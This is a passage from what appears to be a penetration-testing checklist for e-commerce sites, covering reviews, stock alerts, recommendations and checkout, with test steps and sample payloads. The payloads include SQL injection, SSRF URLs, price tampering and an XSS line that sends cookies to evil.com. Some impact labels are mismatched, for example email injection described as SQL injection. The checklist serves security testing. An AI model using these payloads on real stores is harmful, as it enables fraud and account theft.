**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Capture signed download URL 2. Modify file path 3. Access other files

**Expected Result:** Signature should cover entire URL

**Payload Example:**

```
Modify filename while keeping signature
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-137 — Download ZIP Slip
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digital Products / Downloads

**Test Steps:** 1. Purchase product with archive 2. Download and extract 3. Check for path traversal

**Expected Result:** Archives should be scanned

**Payload Example:**

```
ZIP with ../../../malicious entry
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Zip Slip Scanner / Manual Testing

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ECOM-138 — Stored XSS in Reviews
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Submit review with XSS 2. Review posted 3. Other users view and execute XSS

**Expected Result:** Reviews should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in review text
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-139 — Review IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Edit own review 2. Modify review_id 3. Edit another user's review

**Expected Result:** Review edits should verify authorship

**Payload Example:**

```
PUT /api/reviews/victim_review_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-140 — Review IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Delete own review 2. Modify review_id 3. Delete another user's review

**Expected Result:** Review deletions should verify authorship

**Payload Example:**

```
DELETE /api/reviews/victim_review_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-141 — Fake Review Submission
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Submit review without purchase 2. Check if purchase verified 3. Post fake review

**Expected Result:** Reviews should require verified purchase

**Payload Example:**

```
POST /api/products/123/reviews without order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-142 — Rating Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Submit rating 2. Modify rating value out of range 3. Skew product rating

**Expected Result:** Ratings should be validated (1-5)

**Payload Example:**

```
{"rating":100} or {"rating":-50}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-143 — Review Spam Flood
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Submit many reviews rapidly 2. Flood product with reviews 3. Bury legitimate reviews

**Expected Result:** Rate limiting should prevent spam

**Payload Example:**

```
100 reviews in 1 minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ECOM-144 — Review Vote Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Vote on review helpfulness 2. Vote multiple times 3. Artificially boost review

**Expected Result:** One vote per user should be enforced

**Payload Example:**

```
Multiple helpful votes from same user
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-145 — SQL Injection in Review Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Search reviews 2. Inject SQL payload 3. Extract data

**Expected Result:** Review search should be parameterized

**Payload Example:**

```
/reviews?search=' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-146 — Review Image Malware
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Upload review image 2. Include malicious file 3. Execute or spread malware

**Expected Result:** Review images should be validated

**Payload Example:**

```
PHP shell disguised as image
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ECOM-147 — Review Date Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Submit review 2. Modify date parameter 3. Post backdated review

**Expected Result:** Dates should be server-set

**Payload Example:**

```
{"date":"2020-01-01"} for old review
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-148 — Hidden Review Access
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Find moderated/hidden review 2. Access directly 3. View before approval

**Expected Result:** Hidden reviews should be inaccessible

**Payload Example:**

```
GET /api/reviews/pending_review_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-149 — Review Response XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Product Reviews &amp; Ratings

**Test Steps:** 1. Respond to review (as seller) 2. Include XSS 3. Customers view response

**Expected Result:** Responses should be sanitized

**Payload Example:**

```
response=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-150 — Alert IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Create stock alert 2. Modify alert_id 3. Access another user's alerts

**Expected Result:** Alerts should be user-specific

**Payload Example:**

```
GET /api/alerts/victim_alert_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-151 — Email Injection via Alert
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Register for alert 2. Inject email headers 3. Send spam via alert system

**Expected Result:** Email addresses should be validated

**Payload Example:**

```
email=victim@test.com%0aBcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Tools

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-152 — Alert Notification Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Create many alerts 2. Trigger stock update 3. Flood target with notifications

**Expected Result:** Alert count should be limited

**Payload Example:**

```
1000 alerts for same product
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ECOM-153 — Phone Number Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Register SMS alert 2. Inject phone payload 3. Send SMS to premium numbers

**Expected Result:** Phone numbers should be validated

**Payload Example:**

```
phone=+1900PREMIUM
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-154 — Alert Without Authentication
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Register alert for email 2. Register for another user's email 3. Spam or track users

**Expected Result:** Alert registration should verify email ownership

**Payload Example:**

```
Register alert for victim@company.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-155 — Stock Level Information Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Register for alert 2. Analyze notification 3. Get exact stock levels

**Expected Result:** Only availability should be shared

**Payload Example:**

```
Notification with precise stock numbers
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Email Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-156 — Alert Preference Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Update alert preferences 2. Modify user_id 3. Change another user's preferences

**Expected Result:** Preferences should verify ownership

**Payload Example:**

```
PUT /api/users/victim_id/alert-preferences
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-157 — SSRF via Webhook Alert
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Set webhook URL for alert 2. Point to internal resource 3. Receive internal data

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ECOM-158 — XSS in Alert Message
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Stock Alerts / Back in Stock

**Test Steps:** 1. Set custom alert message 2. Include XSS payload 3. Receive malicious email

**Expected Result:** Messages should be sanitized

**Payload Example:**

```
message=<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-159 — Recommendation Algorithm Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Analyze recommendation algorithm 2. Artificially view/buy products 3. Manipulate recommendations

**Expected Result:** Recommendations should resist gaming

**Payload Example:**

```
Mass fake views to boost product
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-160 — Hidden Product in Recommendations
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Get recommendations 2. Check for hidden products 3. Access unreleased items

**Expected Result:** Only visible products should appear

**Payload Example:**

```
Recommendations including hidden_product
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-161 — Recommendation IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Get own recommendations 2. Modify user_id 3. View another user's recommendations

**Expected Result:** Recommendations should be private

**Payload Example:**

```
GET /api/users/victim_id/recommendations
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-162 — Privacy Violation via Recommendations
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. View user's public profile 2. See recommended products 3. Infer purchase history

**Expected Result:** Purchase-based recommendations should be private

**Payload Example:**

```
Profile showing purchase-based recommendations
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ECOM-163 — Recommendation XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Create product with XSS in name 2. Product appears in recommendations 3. XSS executes

**Expected Result:** Product names should be sanitized

**Payload Example:**

```
Product name with <script> tag
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ECOM-164 — Recommendation API Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Query recommendations API 2. Analyze response 3. Find internal data exposure

**Expected Result:** Only necessary data should be exposed

**Payload Example:**

```
Response with margin/supplier/cost fields
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-165 — Cross-User Recommendation Leak
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Share device/browser 2. View recommendations 3. See other user's data

**Expected Result:** Recommendations should be session-specific

**Payload Example:**

```
Cached recommendations from previous user
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ECOM-166 — Recommendation DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Product Recommendations

**Test Steps:** 1. Request many recommendations 2. Use complex filters 3. Exhaust server resources

**Expected Result:** Recommendation queries should be limited

**Payload Example:**

```
/recommendations?limit=999999&include_all=true
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-167 — Price Parameter Tampering
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Add item to cart 2. Intercept checkout request 3. Modify total/item prices 4. Complete order

**Expected Result:** All prices should be server-calculated

**Payload Example:**

```
{"total":0.01} or {"item_price":0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-168 — Currency Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. View prices in expensive currency 2. Switch to cheaper currency at checkout 3. Pay less

**Expected Result:** Currency conversion should be server-side

**Payload Example:**

```
{"currency":"USD"} changed to {"currency":"VND"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-169 — Tax Calculation Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Checkout with tax 2. Modify address to tax-free zone 3. Keep original shipping

**Expected Result:** Tax should be recalculated on address change

**Payload Example:**

```
Modify state/country after tax calculation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-170 — Shipping Cost Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Select shipping method 2. Intercept and modify shipping cost 3. Get free shipping

**Expected Result:** Shipping should be calculated server-side

**Payload Example:**

```
{"shipping_cost":0} or {"shipping_method":"free"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-171 — Order Total Integer Overflow
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Add items with large quantities 2. Cause integer overflow 3. Get negative or zero total

**Expected Result:** Totals should handle large numbers safely

**Payload Example:**

```
Quantity causing overflow: 999999999999
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ECOM-172 — Payment Amount Mismatch
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Initiate payment 2. Modify amount sent to gateway 3. Pay less than order total

**Expected Result:** Payment amount should match order exactly

**Payload Example:**

```
Modify payment_amount before gateway redirect
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Payment Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-173 — Order Status Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. View order status 2. Modify order_id 3. View or modify other orders

**Expected Result:** Order access should verify ownership

**Payload Example:**

```
GET /api/orders/victim_order_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-174 — Refund Fraud via IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Request refund 2. Modify order_id 3. Refund another user's order to your account

**Expected Result:** Refunds should verify ownership

**Payload Example:**

```
POST /api/orders/victim_order_id/refund
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-175 — Double Spending Race Condition
**Test Category:** Race Condition · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Make purchase with wallet/credit 2. Send concurrent requests 3. Spend more than balance

**Expected Result:** Balance deduction should be atomic

**Payload Example:**

```
Parallel purchase requests spending same balance
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-176 — Cart Total Calculation Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Add expensive items 2. Manipulate cart_total parameter 3. Pay modified amount

**Expected Result:** Cart total should always be recalculated

**Payload Example:**

```
Modify cart_total in hidden field or request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-177 — Quantity Decimal Exploit
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Set quantity to decimal 2. Exploit rounding errors 3. Get items cheaper

**Expected Result:** Quantities should be integer only

**Payload Example:**

```
{"quantity":1.00001} to exploit rounding
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-178 — Session Fixation on Checkout
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Create session 2. Share session ID with victim 3. Victim adds payment info 4. Hijack session

**Expected Result:** Session should regenerate at checkout

**Payload Example:**

```
JSESSIONID manipulation before checkout
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## ECOM-179 — CSRF on Purchase
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Create malicious page 2. Auto-submit purchase 3. Victim unknowingly buys item

**Expected Result:** Purchase should require CSRF token and confirmation

**Payload Example:**

```
<form action="/checkout/complete" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ECOM-180 — Clickjacking on Buy Button
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Create page framing checkout 2. Overlay transparent buy button 3. Victim clicks unknowingly

**Expected Result:** Checkout should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over legitimate button
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## ECOM-181 — Payment Gateway SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find callback URL parameter 2. Modify to internal URL 3. Access internal services

**Expected Result:** Callback URLs should be validated

**Payload Example:**

```
callback=http://internal-service:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ECOM-182 — Payment Webhook Spoofing
